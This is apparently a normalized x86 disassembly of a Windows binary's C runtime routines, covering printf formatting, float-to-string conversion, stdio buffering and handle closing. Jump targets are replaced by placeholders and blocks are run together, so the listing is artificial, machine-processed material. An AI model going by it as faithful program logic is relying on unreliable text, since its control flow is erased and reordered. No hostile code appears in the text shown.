lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_431840
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_431840
mov bl [ esi ]
add esp 0xc
inc esi
mov [ ebp + 0xc ] esi
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x4 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov [ ebp - 0x28 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
and [ ebp - 0x3c ] 0x0
cmp [ esi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x4 ] 0x20
jmp r-xdata
cmp bl 0x6c
je r-xdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x4 ] 0x40
cmp [ ebp - 0x8 ] 0x0
lea edi [ ebp - 0x24c ]
mov [ ebp - 0xc ] edi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x4 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
inc esi
inc esi
or [ ebp - 0x3 ] 0x80
mov [ ebp + 0xc ] esi
jmp r-xdata
or [ ebp - 0x4 ] 0x10
jmp r-xdata
cmp bl 0x77
jne r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_4318eb
pop ecx
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_4318de
test [ ebp - 0x4 ] 0x20
pop ecx
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0x8 ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ebp - 0x4 ] edi
jmp r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0x10 ] 0x8
je r-xdata
dec eax
je r-xdata
cmp [ ebp - 0x8 ] edx
jle r-xdata
cmp bl 0x67
jne r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x40 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
push [ ebp - 0x8 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x4c ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x48 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x4c ]
push edi
push eax
call [ rw-data ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_4318de
test eax eax
pop ecx
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x34 ] 0x7
sub eax 0x43
je r-xdata
or [ ebp - 0x4 ] 0x8
jmp r-xdata
call sub_4318de
pop ecx
xor edx edx
call sub_4318de
pop ecx
jmp r-xdata
call sub_4318de
pop ecx
movzx eax ax
jmp r-xdata
call sub_4318de
pop ecx
movsx eax ax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
test edx edx
jg r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
mov [ ebp - 0x38 ] 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x80
je r-xdata
or [ ebp - 0x4 ] edx
jmp r-xdata
mov [ ebp - 0x8 ] 0x8
sub eax 0x3
je r-xdata
cmp [ ebp - 0x8 ] 0xa3
jle r-xdata
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
cmp bl 0x67
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
push eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
test [ ebp - 0x4 ] 0x810
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
dec eax
je r-xdata
mov al [ ebp - 0x34 ]
mov [ ebp - 0x16 ] 0x30
add al 0x51
mov [ ebp - 0x24 ] 0x2
mov [ ebp - 0x15 ] al
jmp r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cdq
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
and [ ebp - 0x1c ] 0x0
jl r-xdata
push [ ebp - 0x30 ]
call sub_42ded6
and [ ebp - 0x30 ] 0x0
pop ecx
cmp [ ebp - 0x8 ] 0xffffffff
mov esi 0x7fffffff
je r-xdata
dec eax
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x15d
push eax
call sub_42dd9c
test eax eax
pop ecx
mov [ ebp - 0x30 ] eax
je r-xdata
cmp [ edi ] 0x2d
jne r-xdata
test esi esi
jne r-xdata
push edi
call [ rw-data ]
pop ecx
call sub_42eea0
pop ecx
jmp r-xdata
test [ ebp - 0x4 ] edi
je r-xdata
call sub_4318de
pop ecx
mov [ ebp - 0x24c ] al
mov [ ebp - 0x10 ] 0x1
call sub_4318fb
push eax
lea eax [ ebp - 0x24c ]
push eax
call sub_43542c
add esp 0xc
mov [ ebp - 0x10 ] eax
test eax eax
jge r-xdata
jmp r-xdata
or [ ebp - 0x4 ] edi
mov [ ebp - 0x40 ] 0x1
add bl 0x20
dec eax
dec eax
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x8 ] eax
jle r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
mov [ ebp - 0x20 ] eax
neg edx
or [ ebp - 0x3 ] 0x1
mov [ ebp - 0x1c ] edx
jmp r-xdata
test eax eax
jae r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_4318de
test [ ebp - 0x4 ] 0x810
pop ecx
mov ecx eax
mov [ ebp - 0xc ] ecx
je r-xdata
mov esi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] 0xa
sub eax 0x3
jne r-xdata
mov [ ebp - 0x8 ] 0xa3
mov edi eax
mov [ ebp - 0xc ] edi
jmp r-xdata
push edi
or [ ebp - 0x3 ] 0x1
inc edi
mov [ ebp - 0xc ] edi
push edi
call [ rw-data ]
pop ecx
mov [ ebp - 0x10 ] eax
and [ ebp - 0x2c ] 0x0
mov [ ebp - 0xc ] ecx
movsx eax [ eax ]
jmp r-xdata
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x2c ] 0x1
jmp r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
lea eax [ ebp - 0x24c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0x38 ] 0x1
jmp r-xdata
sub eax 0xc
jne r-xdata
mov eax [ ebp - 0x20 ]
or eax [ ebp - 0x1c ]
jne r-xdata
mov [ ebp - 0x8 ] eax
test [ ebp - 0x3 ] 0x80
jne r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov [ ebp - 0x34 ] 0x27
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
lea eax [ ebp - 0x4d ]
mov [ ebp - 0xc ] eax
and [ ebp - 0x24 ] 0x0
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x2c ] 0x1
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0xc ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0x10 ] 0x10
je r-xdata
mov esi [ ebp - 0x28 ]
sub esi [ ebp - 0x24 ]
sub esi [ ebp - 0x10 ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
or [ ebp - 0x4 ] edi
mov eax [ ebp - 0x10 ]
cdq
mov edi edx
mov esi eax
push edi
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_430ea0
push edi
push esi
push [ ebp - 0x1c ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x20 ]
call sub_430e30
cmp ebx 0x39
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
jle r-xdata
mov eax [ ebp - 0x20 ]
or eax [ ebp - 0x1c ]
je r-xdata
sub eax ecx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
sub eax ecx
sar eax 0x1
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x16 ]
push [ ebp + 0x8 ]
push [ ebp - 0x24 ]
push eax
call sub_4318a6
add esp 0x10
test bl 0x8
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_431875
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x16 ] 0x2d
jmp r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
mov [ eax ] bl
jmp r-xdata
add ebx [ ebp - 0x34 ]
lea eax [ ebp - 0x4d ]
sub eax [ ebp - 0xc ]
inc [ ebp - 0xc ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0x10 ] eax
je r-xdata
inc eax
jmp r-xdata
inc eax
inc eax
jmp r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x16 ] 0x2b
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
test eax eax
jg r-xdata
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0x30
jne r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
call sub_4318a6
add esp 0x10
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_431875
add esp 0x10
mov [ ebp - 0x16 ] 0x20
dec [ ebp - 0xc ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] 0x30
test eax eax
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_431875
add esp 0x10
mov eax [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
lea edi [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_4318a6
add esp 0x10
mov eax edi
dec edi
test eax eax
jne r-xdata
mov ax [ ebx ]
inc ebx
push eax
lea eax [ ebp - 0x44 ]
push eax
inc ebx
call sub_43542c
pop ecx
test eax eax
pop ecx
jle r-xdata
jmp r-xdata
sub_431840
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
dec [ ecx + 0x4 ]
js r-xdata
push ecx
push [ ebp + 0x8 ]
call sub_430f8a
pop ecx
pop ecx
mov edx [ ecx ]
mov al [ ebp + 0x8 ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ eax ]
pop ebp
retn
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
mov eax [ ebp + 0x10 ]
jne r-xdata
sub_431875
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg r-xdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_431840
add esp 0xc
cmp [ esi ] 0xffffffff
je r-xdata
sub_4318a6
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg r-xdata
movsx eax [ esi ]
push edi
inc esi
push [ esp + 0x1c ]
push eax
call sub_431840
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_431909
mov eax [ rw-data ]
push esi
push 0x14
test eax eax
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_42fc2b
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor ecx ecx
mov eax rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_42fc2b
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov edx [ rw-data ]
mov [ ecx + edx ] eax
add eax 0x20
add ecx 0x4
cmp eax rw-data
jl r-xdata
xor ecx ecx
mov edx rw-data
push 0x1a
call sub_42dba0
pop ecx
or [ edx ] 0xffffffff
test eax eax
jne r-xdata
mov esi ecx
mov eax ecx
sar esi 0x5
and eax 0x1f
mov esi [ esi * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
mov eax [ esi + eax * 4 ]
cmp eax 0xffffffff
je r-xdata
pop esi
retn
add edx 0x20
inc ecx
cmp edx rw-data
jl r-xdata
sub_4319c5
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_430d2a
pop ecx
retn
sub_4319f4
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_430d2a
pop ecx
retn
sub_431a17
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_430d8b
pop ecx
retn
sub_431a46
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_430d8b
pop ecx
retn
sub_431a69
push esi
mov esi [ esp + 0x8 ]
push [ esi + 0x10 ]
call sub_435403
test eax eax
pop ecx
je r-xdata
xor eax eax
pop esi
retn
cmp esi rw-data
jne r-xdata
cmp esi rw-data
jne r-xdata
xor eax eax
jmp r-xdata
push 0x1
pop eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
cmp [ eax * 4 + rw-data ] 0x0
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x18 ] ebx
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x4 ] ebx
push ebx
call sub_42dd9c
test eax eax
pop ecx
mov [ edi ] eax
jne r-xdata
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
push 0x1
pop eax
pop edi
pop ebx
pop esi
retn
sub_431af6
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
pop esi
retn
mov esi [ esp + 0xc ]
test [ esi + 0xd ] 0x10
je r-xdata
push esi
call sub_4320f8
and [ esi + 0xd ] 0xee
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_431b32
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x8 ]
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x10 ]
fdiv [ ebp - 0x8 ]
fmul [ ebp - 0x8 ]
fsubr [ ebp - 0x10 ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fcomp [ r--data ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
leave
retn
push 0x1
pop eax
leave
retn
sub_431b70
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_431b32
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_431b99
push esi
mov esi [ esp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_4356d5
cmp eax 0x65
pop ecx
je r-xdata
mov cl [ rw-data ]
mov al [ esi ]
mov [ esi ] cl
inc esi
inc esi
cmp [ rw-data ] 0x1
jle r-xdata
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
retn
movsx eax [ esi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x4
movsx eax [ esi ]
push 0x4
push eax
call sub_430f15
pop ecx
pop ecx
jmp r-xdata
test eax eax
jne r-xdata
sub_431bf3
mov eax [ esp + 0x4 ]
mov dl [ rw-data ]
mov cl [ eax ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
cmp cl dl
je r-xdata
retn
mov cl [ eax ]
test cl cl
je r-xdata
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx eax
cmp cl 0x65
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
cmp [ eax ] dl
jne r-xdata
cmp cl 0x45
je r-xdata
mov dl [ ecx ]
inc eax
inc ecx
test dl dl
mov [ eax ] dl
jne r-xdata
dec eax
inc eax
jmp r-xdata
sub_431c59
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_435bce
mov eax [ ebp + 0xc ]
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
mov [ eax ] ecx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
call sub_435ba1
mov eax [ ebp + 0xc ]
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn
sub_431c97
push ebp
mov ebp esp
sub esp 0x28
lea eax [ ebp - 0x28 ]
push esi
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
push ecx
fld [ eax ]
fstp [ esp ]
call sub_435c72
mov esi [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp + 0xc ]
lea eax [ esi + 0x1 ]
push eax
xor eax eax
cmp [ ebp - 0x10 ] 0x2d
sete al
xor ecx ecx
test esi esi
setg cl
add edx eax
add ecx edx
push ecx
call sub_435bfb
lea eax [ ebp - 0x10 ]
push 0x0
push eax
push [ ebp + 0x14 ]
push esi
push [ ebp + 0xc ]
call sub_431cf8
mov eax [ ebp + 0xc ]
add esp 0x30
pop esi
leave
retn
sub_431cf8
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x18 ] bl
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
je r-xdata
cmp [ esi ] 0x2d
mov eax edi
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] ebx
setg al
push eax
xor eax eax
cmp [ esi ] 0x2d
sete al
add eax edi
push eax
call sub_431f9a
pop ecx
pop ecx
cmp [ ebp + 0xc ] ebx
jle r-xdata
mov [ edi ] 0x2d
lea eax [ edi + 0x1 ]
xor ecx ecx
cmp [ ebp + 0x18 ] bl
push r--data
sete cl
add ecx eax
add ecx [ ebp + 0xc ]
push ecx
call sub_4350c0
cmp [ ebp + 0x10 ] ebx
pop ecx
pop ecx
mov ecx eax
je r-xdata
mov dl [ eax + 0x1 ]
lea ecx [ eax + 0x1 ]
mov [ eax ] dl
mov eax ecx
mov cl [ rw-data ]
mov [ eax ] cl
mov eax [ esi + 0xc ]
inc ecx
cmp [ eax ] 0x30
je r-xdata
mov [ ecx ] 0x45
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ esi + 0x4 ]
dec ebx
jns r-xdata
inc ecx
cmp ebx 0x64
jl r-xdata
neg ebx
mov [ ecx ] 0x2d
inc ecx
cmp ebx 0xa
jl r-xdata
mov eax ebx
push 0x64
cdq
pop esi
idiv esi
add [ ecx ] al
mov eax ebx
cdq
idiv esi
mov ebx edx
add [ ecx + 0x1 ] bl
mov eax ebx
push 0xa
cdq
pop esi
idiv esi
add [ ecx ] al
mov eax ebx
cdq
idiv esi
mov ebx edx
sub_431dba
push ebp
mov ebp esp
sub esp 0x28
lea eax [ ebp - 0x28 ]
push esi
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
push ecx
fld [ eax ]
fstp [ esp ]
call sub_435c72
mov esi [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
add eax esi
push eax
xor eax eax
cmp [ ebp - 0x10 ] 0x2d
sete al
add eax [ ebp + 0xc ]
push eax
call sub_435bfb
lea eax [ ebp - 0x10 ]
push 0x0
push eax
push esi
push [ ebp + 0xc ]
call sub_431e0f
mov eax [ ebp + 0xc ]
add esp 0x2c
pop esi
leave
retn
sub_431e0f
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push edi
mov eax [ esi + 0x4 ]
dec eax
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ esi ] 0x2d
mov edi ebx
jne r-xdata
cmp eax [ ebp + 0xc ]
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea edi [ ebx + 0x1 ]
xor ecx ecx
cmp [ esi ] 0x2d
sete cl
add ecx eax
add ecx ebx
mov eax ecx
mov [ eax ] 0x30
and [ eax + 0x1 ] 0x0
add edi eax
push 0x1
push edi
call sub_431f9a
pop ecx
mov [ edi ] 0x30
pop ecx
inc edi
jmp r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
pop ebp
retn
push 0x1
push edi
call sub_431f9a
mov al [ rw-data ]
pop ecx
mov [ edi ] al
mov esi [ esi + 0x4 ]
inc edi
pop ecx
test esi esi
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
neg esi
cmp [ ebp + 0xc ] esi
jl r-xdata
neg esi
jmp r-xdata
push [ ebp + 0xc ]
push edi
call sub_431f9a
push [ ebp + 0xc ]
push 0x30
push edi
call sub_42dc30
add esp 0x14
mov [ ebp + 0xc ] esi
sub_431eb6
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
lea eax [ ebp - 0x28 ]
push edi
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
push ecx
fld [ eax ]
fstp [ esp ]
call sub_435c72
mov eax [ ebp - 0xc ]
mov ebx [ ebp + 0x10 ]
lea esi [ eax - 0x1 ]
xor eax eax
cmp [ ebp - 0x10 ] 0x2d
sete al
add eax [ ebp + 0xc ]
mov edi eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
push edi
call sub_435bfb
mov eax [ ebp - 0xc ]
add esp 0x1c
dec eax
cmp esi eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
lea eax [ ebp - 0x10 ]
push 0x1
push eax
push [ ebp + 0x14 ]
push ebx
push [ ebp + 0xc ]
call sub_431cf8
add esp 0x14
cmp eax ebx
jge r-xdata
test cl cl
je r-xdata
lea eax [ ebp - 0x10 ]
push 0x1
push eax
push ebx
push [ ebp + 0xc ]
call sub_431e0f
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
and [ edi - 0x2 ] al
sub_431f49
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x65
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_431c97
cmp [ ebp + 0x10 ] 0x45
je r-xdata
cmp [ ebp + 0x10 ] 0x66
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_431eb6
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_431dba
add esp 0xc
pop ebp
retn
add esp 0x10
pop ebp
retn
sub_431f9a
push edi
mov edi [ esp + 0xc ]
test edi edi
je r-xdata
pop edi
retn
push esi
mov esi [ esp + 0xc ]
push esi
call sub_42eea0
inc eax
push eax
push esi
add esi edi
push esi
call sub_42ea90
add esp 0x10
pop esi
sub_431fbf
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_4301d9
mov [ eax ] 0x9
call sub_4301e2
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_435e4e
push esi
call sub_43201c
push esi
mov edi eax
call sub_435ead
add esp 0xc
mov eax edi
pop edi
pop esi
retn
sub_43201c
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_435e0c
cmp eax 0xffffffff
pop ecx
je r-xdata
xor edi edi
cmp esi 0x1
je r-xdata
xor eax eax
push edi
call sub_430166
pop ecx
or eax 0xffffffff
jmp r-xdata
push 0x2
call sub_435e0c
push 0x1
mov edi eax
call sub_435e0c
pop ecx
cmp eax edi
pop ecx
je r-xdata
cmp esi 0x2
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_435e0c
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_435d8d
mov eax esi
and esi 0x1f
sar eax 0x5
pop ecx
mov eax [ eax * 4 + rw-data ]
lea ecx [ esi + esi * 8 ]
and [ eax + ecx * 4 + 0x4 ] 0x0
test edi edi
je r-xdata
sub_43209f
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_42ded6
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_4320ca
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_4320f8
test eax eax
pop ecx
je r-xdata
test [ esi + 0xd ] 0x40
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_435ecf
neg eax
pop ecx
pop esi
sbb eax eax
retn
sub_4320f8
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi + 0xc ]
mov ecx eax
and ecx 0x3
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
push edi
push eax
push [ esi + 0x10 ]
call sub_432201
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al 0x80
je r-xdata
and al 0xfd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_43215d
push ebx
push esi
push edi
push 0x2
xor ebx ebx
xor edi edi
call sub_430d2a
xor esi esi
pop ecx
cmp [ rw-data ] esi
jle r-xdata
push 0x2
call sub_430d8b
cmp [ esp + 0x14 ] 0x1
pop ecx
mov eax ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
push eax
push esi
call sub_4319f4
mov eax [ rw-data ]
pop ecx
pop ecx
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_431a46
pop ecx
pop ecx
cmp [ esp + 0x10 ] 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push eax
call sub_4320ca
cmp eax 0xffffffff
pop ecx
je r-xdata
test cl 0x2
je r-xdata
inc ebx
jmp r-xdata
push eax
call sub_4320ca
cmp eax 0xffffffff
pop ecx
jne r-xdata
or edi eax
sub_432201
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_4301d9
mov [ eax ] 0x9
call sub_4301e2
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
